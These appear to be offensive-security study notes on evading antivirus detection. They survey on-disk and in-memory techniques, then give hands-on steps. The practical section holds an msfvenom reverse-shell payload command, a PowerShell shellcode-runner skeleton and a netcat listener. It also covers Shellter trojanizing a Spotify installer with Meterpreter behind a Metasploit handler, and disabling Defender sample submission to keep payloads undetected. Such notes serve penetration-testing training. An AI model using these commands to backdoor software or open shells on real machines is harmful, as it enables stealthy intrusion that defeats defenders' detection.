# Bypassing Antivirus Detections

Antivirus evasion falls into two broad categories: **on-disk** and **in-memory**. On-disk evasion focuses on modifying malicious files physically stored on disk to evade AV file-engine detections. Modern AV engines are mature, so malware increasingly attempts **in-memory** operation to avoid writing to disk and reduce detection probability. 
## On-Disk Evasion

Modern on-disk malware obfuscation can take many forms:

- **Packers** — originally designed to reduce binary size and change binary structure (new hash/signature). Simple packers like UPX are usually **insufficient** against modern scanners.
- **Obfuscators** — reorganize and mutate code (semantically equivalent instruction swaps, dead code insertion, function splitting/reordering). Useful against signature-based detection and to hinder reverse engineering; modern obfuscators can also include runtime/in-memory features.
- **Crypters** — cryptographically encrypt executable code and add a decryption stub that restores the original code in memory at runtime. Because only encrypted bytes exist on disk, crypters are very effective for stealth.
- **Additional techniques** — anti-reversing, anti-debugging, VM/emulation detection, software protectors (legitimate anti-copy tools reused for evasion).

## In-Memory Evasion

In-memory techniques avoid writing executable payloads to disk and instead manipulate volatile memory. Key techniques:

### Remote Process Memory Injection

Typical sequence using Windows APIs:

```
OpenProcess() → VirtualAllocEx() → WriteProcessMemory() → CreateRemoteThread()
```

This injects code into another (legitimate) process and executes it there.

### Reflective DLL Injection

Loads a DLL from memory (no `LoadLibrary` from disk). Requires a custom loader because Windows does not provide APIs to load a DLL directly from a memory buffer.

### Process Hollowing

Launch a benign process suspended, replace its image in memory with a malicious executable image, then resume the process so it runs malicious code under the guise of the original process.

### Inline Hooking

Modify function prologues (or similar) to redirect execution to attacker-controlled code and then return. Often used by rootkits; typically requires elevated privileges.

# AV Evasion in Practice

This section covers testing best practices, a PowerShell in-memory example, and automation tools.

## Testing for AV Evasion

Consider the impact of sample submission and environment parity:

- **VirusTotal** — scans across many AV vendors but shares samples; submitting a sample can cause vendors to analyze and fingerprint it (burns the payload).
- **Kleenscan.com** — claims to scan against ≈30 AV engines without sharing samples (limited free scans). Use with caution.
- **Best practice** — build a dedicated VM that mirrors the customer environment, disable automatic sample submission there, and test locally. Example: disable Windows Defender automatic sample submission via the GUI:

```
Windows Security > Virus & threat protection > Manage Settings > Automatic sample submission → Off
```

Prefer **custom code** where feasible, since unique payloads reduce signature overlap with known malware.

## Evading AV with Thread Injection (PowerShell example)

This example demonstrates an in-memory injection approach using PowerShell reflection and an msfvenom-generated payload. The flow and the primary commands used in the original example are given verbatim for convenience.

### Generate a PowerShell reflection payload with msfvenom

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
```

### PowerShell skeleton used to allocate memory and execute shellcode

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

# <place shellcode here>
```

### Common PowerShell execution policy commands (view & set for current user)

```powershell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

### Prepare a Netcat listener on the attacker machine

```bash
nc -lvnp 443
```

### Run the PowerShell script on the target (example)

```powershell
.\bypass.ps1
```

> [!CAUTION]
> Use an x86 PowerShell instance if the payload is x86.


## Automating the Process (Shellter example)

Shellter is a dynamic shellcode injection/PE-infector tool that can automate stealthy injection into PE files.

### Install Shellter (and Wine for Windows PE tooling on Linux)

```bash
sudo apt install shellter wine
sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32

# If we are using an ARM processor, we need to a slightly different set of commands.
sudo apt install wine
sudo dpkg --add-architecture amd64
sudo  apt install -y qemu-user-static binfmt-support
sudo apt-get update && apt-get install wine32
```

### Run Shellter (auto mode) and inject a payload

```bash
shellter
# then follow interactive prompts:
# - choose Auto mode (A)
# - provide target PE path, e.g. /home/kali/Downloads/SpotifyFullWin10-32bit.exe
# - enable Stealth Mode
# - choose payload (e.g., meterpreter)
```

### Set up a Metasploit handler for a Meterpreter reverse payload

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.50.1; set LPORT 443; run;"
```

**Practical notes**

- Shellter creates a backup of the original PE and attempts to keep the original execution flow (Stealth Mode).
- In the example, Meterpreter payloads were the only reliable option under Windows 11 for the tested setup.
- Automated PE infectors may still be detected by advanced EDRs; tailor tooling to the target environment and always test in controlled VMs.